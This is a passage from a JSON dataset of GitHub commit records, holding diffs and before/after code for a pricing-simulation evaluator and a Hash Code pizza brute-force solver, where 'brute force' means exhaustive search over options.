It is much different from ceil(expected_val = 0.95) = 1 <> actual_mean = 1.54\r\n-        actual_means = []\r\n-        for i in range(0,len(units_mean)):\r\n-            empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r\n-            actual_means.append(int(empiric_mean*100) \/ 100)\r\n-        self.units_mean = np.array(actual_means)\r\n-        \r\n+        if convert_units:\r\n+            actual_means = []\r\n+            for i in range(0,len(units_mean)):\r\n+                empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r\n+                actual_means.append(int(empiric_mean*100) \/ 100)\r\n+            self.units_mean = np.array(actual_means)\r\n+        else:\r\n+            self.units_mean = np.array(units_mean)\r\n+            \r\n         self.verbose = verbose\r\n \r\n     def computeMargin(self):\r\ndiff --git a\/Model\/Evaluator\/GraphEvaluator.py b\/Model\/Evaluator\/GraphEvaluator.py\nindex 0726576..09a1deb 100644\n--- a\/Model\/Evaluator\/GraphEvaluator.py\n+++ b\/Model\/Evaluator\/GraphEvaluator.py\n@@ -6,9 +6,9 @@\n \r\n class GraphEvaluator(Evaluator):\r\n     def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n-                alphas=[], margins=[], units_mean=[], verbose=False):\r\n+                alphas=[], margins=[], units_mean=None, convert_units=True, verbose=False):\r\n         super(GraphEvaluator, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n-                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n+                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r\n \r\n         lambda_mat = np.full((self.n_products,self.n_products), 0, dtype=float)\r\n         for i in range(0,len(products_list)):\r\ndiff --git a\/Utilities.ipynb b\/Utilities.ipynb\nindex 6cc59e4..de0834f 100644\n--- a\/Utilities.ipynb\n+++ b\/Utilities.ipynb\n@@ -24,9 +24,9 @@\n     \"\\n\",\n     \"# ==== PARAMETERS TO CHANGE ====\\n\",\n     \"config_path = \\\".\/Configs\/config1.json\\\"\\n\",\n-    \"RANDOM_ARM = True\\n\",\n-    \"arm = [2, 2, 0, 1, 0]\\n\",\n-    \"n_experiments = 400\\n\",\n+    \"RANDOM_ARM = False\\n\",\n+    \"arm = [1, 2, 0, 1, 0]\\n\",\n+    \"n_experiments = 500\\n\",\n     \"# ==============================\\n\",\n     \"\\n\",\n     \"f = open(config_path)\\n\",\n@@ -49,9 +49,9 @@\n     \"    armConvRates = [uc[\\\"conversionRates\\\"][i][arm[i]] for i in range(0,len(arm))]\\n\",\n     \"    productList = [Product(int(key), uc[\\\"secondary\\\"][key]) for key in uc[\\\"secondary\\\"]]\\n\",\n     \"    eval = GraphEvaluator(products_list=productList, click_prob_matrix=uc[\\\"clickProbability\\\"], lambda_prob=uc[\\\"lambda\\\"], conversion_rates=armConvRates,\\n\",\n-    \"                alphas=uc[\\\"alphas\\\"], margins=margins, units_mean=uc[\\\"unitsShape\\\"], verbose=False)\\n\",\n+    \"                alphas=uc[\\\"alphas\\\"], margins=margins, units_mean=uc[\\\"unitsShape\\\"], convert_units=True, verbose=False)\\n\",\n     \"    baseline = Baseline(products_list=productList, click_prob_matrix=uc[\\\"clickProbability\\\"], lambda_prob=uc[\\\"lambda\\\"], conversion_rates=armConvRates,\\n\",\n-    \"                alphas=uc[\\\"alphas\\\"], margins=margins, units_mean=uc[\\\"unitsShape\\\"], verbose=False)\\n\",\n+    \"                alphas=uc[\\\"alphas\\\"], margins=margins, units_mean=uc[\\\"unitsShape\\\"], convert_units=True, verbose=False)\\n\",\n     \"    oneStep = OneStepEvaluator(products_list=productList, click_prob_matrix=uc[\\\"clickProbability\\\"], lambda_prob=uc[\\\"lambda\\\"], conversion_rates=armConvRates,\\n\",\n     \"                alphas=uc[\\\"alphas\\\"], margins=margins, units_mean=uc[\\\"unitsShape\\\"], verbose=False)\\n\",\n     \"\\n\",\n@@ -94,9 +94,13 @@\n     \"from Model.GraphProbabilities import *\\n\",\n     \"from Model.Evaluator.GraphEvaluator import GraphEvaluator\\n\",\n     \"from Model.Evaluator.Baseline import Baseline\\n\",\n+    \"from tqdm import tqdm\\n\",\n+    \"from IPython.display import clear_output\\n\",\n+    \"\\n\",\n+    \"\\n\",\n     \"\\n\",\n     \"# ==== PARAMETERS TO CHANGE ====\\n\",\n-    \"CONFIG_PATH = '.\/Configs\/config1.json'\\n\",\n+    \"CONFIG_PATH = '.\/Configs\/configuration5.json'\\n\",\n     \"# ==============================\\n\",\n     \"\\n\",\n     \"\\n\",\n@@ -107,6 +111,7 @@\n     \"opt_arms = []\\n\",\n     \"opt_margins = []\\n\",\n     \"daily_users = []\\n\",\n+    \"print(\\\"Starting the analysis ...\\\\n\\\")\\n\",\n     \"for k in range(0, len(config[\\\"classes\\\"])):\\n\",\n     \"    uc = config[\\\"classes\\\"][k]\\n\",\n     \"\\n\",\n@@ -118,12 +123,20 @@\n     \"    lambda_p = uc[\\\"lambda\\\"]\\n\",\n     \"    alphas = uc[\\\"alphas\\\"]\\n\",\n     \"    units_mean = uc[\\\"unitsShape\\\"]\\n\",\n+    \"    # Early transform for efficiency reason\\n\",\n+    \"    actual_means = []\\n\",\n+    \"    for i in range(0,len(units_mean)):\\n\",\n+    \"        empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\\n\",\n+    \"        actual_means.append(int(empiric_mean*100) \/ 100)\\n\",\n+    \"    units_mean = actual_means\\n\",\n+    \"\\n\",\n     \"    daily_users.append(uc[\\\"usersMean\\\"])\\n\",\n     \"    num_prices = len(conversionRateLevels[0])\\n\",\n     \"    num_prods = len(alphas)\\n\",\n     \"\\n\",\n+    \"    print(\\\"Brute forcing class {}\\\".format(k))\\n\",\n     \"    bf = BruteForce(num_prices=num_prices, num_products=num_prods)\\n\",\n-    \"    for i in range(0, num_prices**num_prods):\\n\",\n+    \"    for i in tqdm(range(0, num_prices**num_prods)):\\n\",\n     \"        pulledArm = bf.pull_arm()\\n\",\n     \"        margins = []\\n\",\n     \"        convRates = []\\n\",\n@@ -133,9 +146,9 @@\n     \"\\n\",\n     \"        price_configuration_margin = 0\\n\",\n     \"        eval = GraphEvaluator(products_list=productList, click_prob_matrix=click_prob, lambda_prob=lambda_p, conversion_rates=convRates,\\n\",\n-    \"                        alphas=alphas, margins=margins, units_mean=units_mean, verbose=False)\\n\",\n+    \"                        alphas=alphas, margins=margins, units_mean=units_mean, convert_units=False, verbose=False)\\n\",\n     \"        eval2 = Baseline(products_list=productList, click_prob_matrix=click_prob, lambda_prob=lambda_p, conversion_rates=convRates,\\n\",\n-    \"                        alphas=alphas, margins=margins, units_mean=units_mean, verbose=False)\\n\",\n+    \"                        alphas=alphas, margins=margins, units_mean=units_mean, convert_units=False, verbose=False)\\n\",\n     \"\\n\",\n     \"        overall_margin = eval.computeMargin()\\n\",\n     \"        baseline = eval2.computeMargin()\\n\",\n@@ -146,7 +159,7 @@\n     \"\\n\",\n     \"    opt_arms.append(bf.get_optima())\\n\",\n     \"    opt_margins.append(bf.get_optima_margin())\\n\",\n-    \"\\n\",\n+    \"clear_output(wait=True)\\n\",\n     \"print(\\\"BRUTE FORCE OF CONFIG {} CLASSES:\\\".format(CONFIG_PATH))\\n\",\n     \"for i in range(0,len(opt_arms)):\\n\",\n     \"    print(\\\"   - [CLASS {}] Optimal arm is {} with margin {}\\\".format(i,opt_arms[i], opt_margins[i]))\\n\",\n","files":{"\/Model\/Evaluator\/Baseline.py":{"changes":[{"diff":"\n \r\n \r\n class Baseline(Evaluator):\r\n-    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], verbose=False):\r\n+    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], convert_units=True, verbose=False):\r\n             super(Baseline, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n-                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n+                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r\n \r\n     def computeMargin(self):\r\n         return np.multiply(np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates),self.alphas).sum()\r","add":2,"remove":2,"filename":"\/Model\/Evaluator\/Baseline.py","badparts":["    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], verbose=False):\r","                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r"],"goodparts":["    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], convert_units=True, verbose=False):\r","                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r"]}],"source":"\nimport numpy as np\r from Model.Evaluator.Evaluator import Evaluator\r \r \r class Baseline(Evaluator):\r def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], verbose=False):\r super(Baseline, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r \r def computeMargin(self):\r return np.multiply(np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates),self.alphas).sum()\r ","sourceWithComments":"import numpy as np\r\nfrom Model.Evaluator.Evaluator import Evaluator\r\n\r\n\r\nclass Baseline(Evaluator):\r\n    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], verbose=False):\r\n            super(Baseline, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n\r\n    def computeMargin(self):\r\n        return np.multiply(np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates),self.alphas).sum()\r\n"},"\/Model\/Evaluator\/Evaluator.py":{"changes":[{"diff":"\n \r\n class Evaluator:\r\n     def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n-                alphas=[], margins=[], verbose=False, units_mean=[]):\r\n+                alphas=[], margins=[], verbose=False, units_mean=None, convert_units=True):\r\n         assert len(products_list) == len(conversion_rates) and len(products_list) == len(alphas)\r\n         assert len(products_list) == len(margins)\r\n         assert len(alphas) == len(units_mean)\r\n         assert click_prob_matrix is not None\r\n+        assert units_mean is not None\r\n \r\n         self.click_prob_matrix = np.array(click_prob_matrix).tolist()\r\n         self.products_list = products_list\r\n","add":2,"remove":1,"filename":"\/Model\/Evaluator\/Evaluator.py","badparts":["                alphas=[], margins=[], verbose=False, units_mean=[]):\r"],"goodparts":["                alphas=[], margins=[], verbose=False, units_mean=None, convert_units=True):\r","        assert units_mean is not None\r"]},{"diff":"\n         #       E.G. np.ceil(np.random.gamma(.95, 1, size=1000000)).mean() ---> mean = 1.541436\r\n         #       If I repeat the process 10 times then std = 0.0011484\r\n         #       It is much different from ceil(expected_val = 0.95) = 1 <> actual_mean = 1.54\r\n-        actual_means = []\r\n-        for i in range(0,len(units_mean)):\r\n-            empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r\n-            actual_means.append(int(empiric_mean*100) \/ 100)\r\n-        self.units_mean = np.array(actual_means)\r\n-        \r\n+        if convert_units:\r\n+            actual_means = []\r\n+            for i in range(0,len(units_mean)):\r\n+                empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r\n+                actual_means.append(int(empiric_mean*100) \/ 100)\r\n+            self.units_mean = np.array(actual_means)\r\n+        else:\r\n+            self.units_mean = np.array(units_mean)\r\n+            \r\n         self.verbose = verbose\r\n \r\n     def computeMargin(self):","add":9,"remove":6,"filename":"\/Model\/Evaluator\/Evaluator.py","badparts":["        actual_means = []\r","        for i in range(0,len(units_mean)):\r","            empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r","            actual_means.append(int(empiric_mean*100) \/ 100)\r","        self.units_mean = np.array(actual_means)\r","        \r"],"goodparts":["        if convert_units:\r","            actual_means = []\r","            for i in range(0,len(units_mean)):\r","                empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r","                actual_means.append(int(empiric_mean*100) \/ 100)\r","            self.units_mean = np.array(actual_means)\r","        else:\r","            self.units_mean = np.array(units_mean)\r","            \r"]}],"source":"\nimport numpy as np\r import math\r \r class Evaluator:\r def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r alphas=[], margins=[], verbose=False, units_mean=[]):\r assert len(products_list)==len(conversion_rates) and len(products_list)==len(alphas)\r assert len(products_list)==len(margins)\r assert len(alphas)==len(units_mean)\r assert click_prob_matrix is not None\r \r self.click_prob_matrix=np.array(click_prob_matrix).tolist()\r self.products_list=products_list\r self.lambda_prob=lambda_prob\r self.conversion_rates=np.array(conversion_rates)\r self.n_products=len(products_list)\r self.alphas=np.array(alphas)\r self.margins=np.array(margins)\r \r actual_means=[]\r for i in range(0,len(units_mean)):\r empiric_mean=np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r actual_means.append(int(empiric_mean*100) \/ 100)\r self.units_mean=np.array(actual_means)\r \r self.verbose=verbose\r \r def computeMargin(self):\r return 0 ","sourceWithComments":"import numpy as np\r\nimport math\r\n\r\nclass Evaluator:\r\n    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n                alphas=[], margins=[], verbose=False, units_mean=[]):\r\n        assert len(products_list) == len(conversion_rates) and len(products_list) == len(alphas)\r\n        assert len(products_list) == len(margins)\r\n        assert len(alphas) == len(units_mean)\r\n        assert click_prob_matrix is not None\r\n\r\n        self.click_prob_matrix = np.array(click_prob_matrix).tolist()\r\n        self.products_list = products_list\r\n        self.lambda_prob = lambda_prob\r\n        self.conversion_rates = np.array(conversion_rates)\r\n        self.n_products = len(products_list)\r\n        self.alphas = np.array(alphas)\r\n        self.margins = np.array(margins)\r\n\r\n        # Cannot integrate the gamma function, so empirically compute the ceiled mean\r\n        # In environment: num_units = math.ceil(gamma(expected_val))\r\n        # So the average number of units sold is different from expected_val\r\n        # To get actual mean we should integrate gamma between [0,1] to get P(units=1) and so on for all intervals\r\n        # Then the actual units mean will be sum{i} of P(units=i)*i\r\n        # I've done it empirically by generating a lot of samples (not so clean solution but effective)\r\n        #       E.G. np.ceil(np.random.gamma(.95, 1, size=1000000)).mean() ---> mean = 1.541436\r\n        #       If I repeat the process 10 times then std = 0.0011484\r\n        #       It is much different from ceil(expected_val = 0.95) = 1 <> actual_mean = 1.54\r\n        actual_means = []\r\n        for i in range(0,len(units_mean)):\r\n            empiric_mean = np.ceil(np.random.gamma(units_mean[i], 1, size=1000000)).mean()\r\n            actual_means.append(int(empiric_mean*100) \/ 100)\r\n        self.units_mean = np.array(actual_means)\r\n        \r\n        self.verbose = verbose\r\n\r\n    def computeMargin(self):\r\n        return 0"},"\/Model\/Evaluator\/GraphEvaluator.py":{"changes":[{"diff":"\n \r\n class GraphEvaluator(Evaluator):\r\n     def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n-                alphas=[], margins=[], units_mean=[], verbose=False):\r\n+                alphas=[], margins=[], units_mean=None, convert_units=True, verbose=False):\r\n         super(GraphEvaluator, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n-                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n+                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r\n \r\n         lambda_mat = np.full((self.n_products,self.n_products), 0, dtype=float)\r\n         for i in range(0,len(products_list))","add":2,"remove":2,"filename":"\/Model\/Evaluator\/GraphEvaluator.py","badparts":["                alphas=[], margins=[], units_mean=[], verbose=False):\r","                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r"],"goodparts":["                alphas=[], margins=[], units_mean=None, convert_units=True, verbose=False):\r","                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r"]}],"source":"\nfrom Model.Evaluator.Evaluator import Evaluator\r from Model.GraphProbabilities import GraphProbabilities\r from Model.Evaluator.StepNode import StepNode\r import numpy as np\r from Model.Evaluator.Evaluator import Evaluator\r \r class GraphEvaluator(Evaluator):\r def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r alphas=[], margins=[], units_mean=[], verbose=False):\r super(GraphEvaluator, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r \r lambda_mat=np.full((self.n_products,self.n_products), 0, dtype=float)\r for i in range(0,len(products_list)):\r assert i==products_list[i].getProductNumber()\r endFirst=products_list[i].getSecondaryProduct(0)\r endSecond=products_list[i].getSecondaryProduct(1)\r lambda_mat[i][endFirst]=1\r lambda_mat[i][endSecond]=lambda_prob\r \r conv_mat=[]\r for i in range(0,len(conversion_rates)):\r conv_mat.append(np.full((len(products_list)), conversion_rates[i]).tolist())\r \r w_matrix=GraphProbabilities(self.click_prob_matrix)\r lambda_matrix=GraphProbabilities(lambda_mat.tolist())\r conversion_matrix=GraphProbabilities(conv_mat)\r \r y_matrix=w_matrix.multiplyElementWise(lambda_matrix)\r self.y_matrix=y_matrix.multiplyElementWise(conversion_matrix)\r \r \r def computeSingleProduct(self, product):\r firstNode=StepNode(product,[np.array([], dtype=int)], graph_prob=self.y_matrix, verbose=self.verbose)\r nodes=[firstNode]\r joint_prob=np.full((len(self.products_list)), 0).tolist()\r joint_prob[product]=1\r for i in range(0, len(self.products_list)-1):\r product_nodes=np.full((len(self.products_list)), None)\r for k in range(0,len(nodes)):\r node=nodes[k]\r following=node.expand()\r for j in range(0,len(following)):\r if following[j].isFeasible()==True:\r if product_nodes[following[j].product] is not None:\r product_nodes[following[j].product].merge(following[j])\r else:\r product_nodes[following[j].product]=following[j]\r \r existing_nodes=product_nodes[product_nodes !=np.array(None)]\r reached_nodes=\"\"\r for k in range(0,len(existing_nodes)):\r index=existing_nodes[k].product\r reached_nodes=reached_nodes +str(index) +\"; \"\r reaching_probability=existing_nodes[k].computeProbability()\r joint_prob[index] +=reaching_probability\r if self.verbose: print(\"Probability of visiting nodes in at most{}-step from{}:{}\".format(i+1, product, joint_prob))\r nodes=existing_nodes\r return np.array(joint_prob)\r \r def computeMargin(self):\r single_margins=np.full((len(self.products_list)), 0)\r for i in range(0,len(self.products_list)):\r visiting_prob=self.computeSingleProduct(i)\r if self.verbose: print(\"Visiting probability from product{}:{}\".format(i, visiting_prob))\r if(visiting_prob > np.full(len(visiting_prob),1.1)).any() and False:\r self.verbose=True\r print(\"======ASSERT WARNING ! DEBUG MODE=======\")\r visiting_prob=self.computeSingleProduct(i)\r print(\"======ASSERT WARNING ! DEBUG MODE END=======\")\r self.verbose=False\r visiting_prob[visiting_prob > 1]=1\r single_margins[i]=np.multiply(visiting_prob,np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates)).sum()\r return np.multiply(single_margins, self.alphas).sum()\r ","sourceWithComments":"from Model.Evaluator.Evaluator import Evaluator\r\nfrom Model.GraphProbabilities import GraphProbabilities\r\nfrom Model.Evaluator.StepNode import StepNode\r\nimport numpy as np\r\nfrom Model.Evaluator.Evaluator import Evaluator\r\n\r\nclass GraphEvaluator(Evaluator):\r\n    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n                alphas=[], margins=[], units_mean=[], verbose=False):\r\n        super(GraphEvaluator, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n\r\n        lambda_mat = np.full((self.n_products,self.n_products), 0, dtype=float)\r\n        for i in range(0,len(products_list)):\r\n            assert i == products_list[i].getProductNumber()\r\n            endFirst = products_list[i].getSecondaryProduct(0)\r\n            endSecond = products_list[i].getSecondaryProduct(1)\r\n            # if verbose: print(\"Coordinates {},{} ----- {},{}\".format(i,endFirst,i,endSecond))\r\n            lambda_mat[i][endFirst] = 1\r\n            lambda_mat[i][endSecond] = lambda_prob\r\n        #if verbose: print(lambda_mat)\r\n        \r\n        conv_mat = []\r\n        for i in range(0,len(conversion_rates)):\r\n            conv_mat.append(np.full((len(products_list)), conversion_rates[i]).tolist())\r\n        #if verbose: print(conv_mat)\r\n        \r\n        w_matrix = GraphProbabilities(self.click_prob_matrix)\r\n        lambda_matrix = GraphProbabilities(lambda_mat.tolist())\r\n        conversion_matrix = GraphProbabilities(conv_mat)\r\n\r\n        y_matrix = w_matrix.multiplyElementWise(lambda_matrix)\r\n        self.y_matrix = y_matrix.multiplyElementWise(conversion_matrix)\r\n\r\n        #if verbose: print(self.y_matrix.weightMatrix)\r\n\r\n    def computeSingleProduct(self, product):\r\n        firstNode = StepNode(product, [np.array([], dtype=int)], graph_prob=self.y_matrix, verbose=self.verbose)\r\n        nodes=[firstNode]\r\n        joint_prob = np.full((len(self.products_list)), 0).tolist()\r\n        joint_prob[product] = 1\r\n        # Iterate for #steps times\r\n        for i in range(0, len(self.products_list)-1):\r\n            # Next nodes\r\n            product_nodes = np.full((len(self.products_list)), None)\r\n            # if self.verbose: print(\"Nodes to be expanded: {}\".format(len(nodes)))\r\n            for k in range(0,len(nodes)):\r\n                node = nodes[k]\r\n                following = node.expand()\r\n                for j in range(0,len(following)):\r\n                    if following[j].isFeasible() == True:\r\n                        if product_nodes[following[j].product] is not None:\r\n                            product_nodes[following[j].product].merge(following[j])\r\n                        else:\r\n                            product_nodes[following[j].product] = following[j]\r\n            \r\n            # Remove None elements\r\n            existing_nodes = product_nodes[product_nodes != np.array(None)]\r\n            reached_nodes = \"\"\r\n            # if self.verbose: print(\"Nodes reached from previous step: {} total {}\".format(product_nodes, len(existing_nodes)))\r\n            for k in range(0,len(existing_nodes)):\r\n                index = existing_nodes[k].product\r\n                reached_nodes = reached_nodes + str(index) + \"; \"\r\n                # existing_nodes[k].computeProbability() is the probability of visiting \"index\" in (i+1)-steps\r\n                reaching_probability = existing_nodes[k].computeProbability()\r\n                joint_prob[index] += reaching_probability\r\n            if self.verbose: print(\"Probability of visiting nodes in at most {}-step from {}: {}\".format(i+1, product, joint_prob))\r\n            nodes = existing_nodes\r\n        # Probability of visiting product\r\n        return  np.array(joint_prob)\r\n\r\n    def computeMargin(self):\r\n        single_margins = np.full((len(self.products_list)), 0)\r\n        for i in range(0,len(self.products_list)):\r\n            visiting_prob = self.computeSingleProduct(i)\r\n            if self.verbose: print(\"Visiting probability from product {}: {}\".format(i, visiting_prob))\r\n            if (visiting_prob > np.full(len(visiting_prob),1.1)).any() and False:\r\n                self.verbose = True\r\n                print(\"====== ASSERT WARNING ! DEBUG MODE =======\")\r\n                visiting_prob = self.computeSingleProduct(i)\r\n                print(\"====== ASSERT WARNING ! DEBUG MODE END =======\")\r\n                self.verbose = False\r\n            # assert (visiting_prob <= np.full(len(visiting_prob),1.1)).all(), \"Probability of visiting greater than one {}, margins {}\".format(visiting_prob, self.margins)\r\n            visiting_prob[visiting_prob > 1] = 1\r\n            # Margin if alpha = [1 0 0 0 0]\r\n            single_margins[i] = np.multiply(visiting_prob,np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates)).sum()\r\n            #if self.verbose: print(\"Expected value margin for product {} as starting is {} \\n\".format(i, single_margins[i]))\r\n        # Weight the single margin by alpha\r\n        return np.multiply(single_margins, self.alphas).sum()\r\n            "}},"msg":"Improved efficiency of brute force (convert_units param)"}},"https:\/\/github.com\/freekdh\/hashcode_22_practice_problem":{"5282f336a1d136e19c61bbc42e74ef5fc3f26a48":{"url":"https:\/\/api.github.com\/repos\/freekdh\/hashcode_22_practice_problem\/commits\/5282f336a1d136e19c61bbc42e74ef5fc3f26a48","html_url":"https:\/\/github.com\/freekdh\/hashcode_22_practice_problem\/commit\/5282f336a1d136e19c61bbc42e74ef5fc3f26a48","message":"improve on brute force","sha":"5282f336a1d136e19c61bbc42e74ef5fc3f26a48","keyword":"brute force improve","diff":"diff --git a\/hashcode22\/__pycache__\/output_writer.cpython-38.pyc b\/hashcode22\/__pycache__\/output_writer.cpython-38.pyc\nnew file mode 100644\nindex 0000000..2466b60\nBinary files \/dev\/null and b\/hashcode22\/__pycache__\/output_writer.cpython-38.pyc differ\ndiff --git a\/hashcode22\/__pycache__\/solution.cpython-38.pyc b\/hashcode22\/__pycache__\/solution.cpython-38.pyc\nnew file mode 100644\nindex 0000000..a2d0ae0\nBinary files \/dev\/null and b\/hashcode22\/__pycache__\/solution.cpython-38.pyc differ\ndiff --git a\/hashcode22\/algorithms\/__pycache__\/brute_force.cpython-38.pyc b\/hashcode22\/algorithms\/__pycache__\/brute_force.cpython-38.pyc\nindex 20dea8c..eb94d45 100644\nBinary files a\/hashcode22\/algorithms\/__pycache__\/brute_force.cpython-38.pyc and b\/hashcode22\/algorithms\/__pycache__\/brute_force.cpython-38.pyc differ\ndiff --git a\/hashcode22\/algorithms\/brute_force.py b\/hashcode22\/algorithms\/brute_force.py\nindex 3c11a96..e739aee 100644\n--- a\/hashcode22\/algorithms\/brute_force.py\n+++ b\/hashcode22\/algorithms\/brute_force.py\n@@ -1,5 +1,7 @@\n from itertools import chain, combinations\n from typing import Iterable\n+\n+from hashcode22.solution import Solution\n from ..problem import Problem\n from dataclasses import dataclass\n \n@@ -22,7 +24,7 @@ def solve(self, problem: Problem):\n             if score > best_score:\n                 score = best_score\n                 best_pizza = pizza\n-        return best_pizza\n+        return Solution(pizza=best_pizza)\n \n     def _make_pizza(self, ingredients: Iterable[set]):\n         return Pizza(ingredients=ingredients)\ndiff --git a\/hashcode22\/main.py b\/hashcode22\/main.py\nindex 6cd6f9f..866b3b3 100644\n--- a\/hashcode22\/main.py\n+++ b\/hashcode22\/main.py\n@@ -1,11 +1,12 @@\n from hashcode22.algorithms.brute_force import BruteForceAlgorithm\n from file_parser import FileParser\n+from hashcode22.output_writer import OutputWriter\n from problem import Problem\n \n \n def main(problem):\n     solution = BruteForceAlgorithm().solve(problem=problem)\n-    print(solution)\n+    OutputWriter().write(solution, \"test.txt\")\n \n \n if __name__ == \"__main__\":\ndiff --git a\/hashcode22\/output_writer.py b\/hashcode22\/output_writer.py\nnew file mode 100644\nindex 0000000..e77b5b1\n--- \/dev\/null\n+++ b\/hashcode22\/output_writer.py\n@@ -0,0 +1,11 @@\n+class OutputWriter:\n+    def __init__(self):\n+        pass\n+\n+    def write(self, solution, file_path: str):\n+        with open(file_path, \"w\") as file:\n+            file.write(str(solution.n_ingredients))\n+            for ingredient in solution.ingredients:\n+                file.write(f\" {ingredient}\")\n+        \n+        print(\"Done!\")\n\\ No newline at end of file\ndiff --git a\/hashcode22\/solution.py b\/hashcode22\/solution.py\nnew file mode 100644\nindex 0000000..43b9931\n--- \/dev\/null\n+++ b\/hashcode22\/solution.py\n@@ -0,0 +1,13 @@\n+from dataclasses import dataclass\n+\n+@dataclass\n+class Solution:\n+    pizza: str\n+\n+    @property\n+    def n_ingredients(self):\n+        return len(self.pizza.ingredients)\n+\n+    @property\n+    def ingredients(self):\n+        return self.pizza.ingredients\n\\ No newline at end of file\ndiff --git a\/test.txt b\/test.txt\nnew file mode 100644\nindex 0000000..3bfa21f\n--- \/dev\/null\n+++ b\/test.txt\n@@ -0,0 +1 @@\n+6 mushrooms cheese peppers basil pineapple tomatoes\n\\ No newline at end of file\n","files":{"\/hashcode22\/algorithms\/brute_force.py":{"changes":[{"diff":"\n             if score > best_score:\n                 score = best_score\n                 best_pizza = pizza\n-        return best_pizza\n+        return Solution(pizza=best_pizza)\n \n     def _make_pizza(self, ingredients: Iterable[set]):\n         return Pizza(ingredients=ingredien","add":1,"remove":1,"filename":"\/hashcode22\/algorithms\/brute_force.py","badparts":["        return best_pizza"],"goodparts":["        return Solution(pizza=best_pizza)"]}],"source":"\nfrom itertools import chain, combinations from typing import Iterable from..problem import Problem from dataclasses import dataclass @dataclass class Pizza: ingredients: set class BruteForceAlgorithm: def __init__(self): pass def solve(self, problem: Problem): ingredients=problem.get_ingredients() best_score, best_pizza=0, None for ingredients_ in self._powerset(ingredients): pizza=self._make_pizza(ingredients_) score=problem.get_score(pizza) if score > best_score: score=best_score best_pizza=pizza return best_pizza def _make_pizza(self, ingredients: Iterable[set]): return Pizza(ingredients=ingredients) def _powerset(self, iterable): \"powerset([1,2,3]) -->()(1,)(2,)(3,)(1,2)(1,3)(2,3)(1,2,3)\" s=list(iterable) return chain.from_iterable(combinations(s, r) for r in range(len(s) +1)) ","sourceWithComments":"from itertools import chain, combinations\nfrom typing import Iterable\nfrom ..problem import Problem\nfrom dataclasses import dataclass\n\n\n@dataclass\nclass Pizza:\n    ingredients: set\n\n\nclass BruteForceAlgorithm:\n    def __init__(self):\n        pass\n\n    def solve(self, problem: Problem):\n        ingredients = problem.get_ingredients()\n        best_score, best_pizza = 0, None\n        for ingredients_ in self._powerset(ingredients):\n            pizza = self._make_pizza(ingredients_)\n            score = problem.get_score(pizza)\n            if score > best_score:\n                score = best_score\n                best_pizza = pizza\n        return best_pizza\n\n    def _make_pizza(self, ingredients: Iterable[set]):\n        return 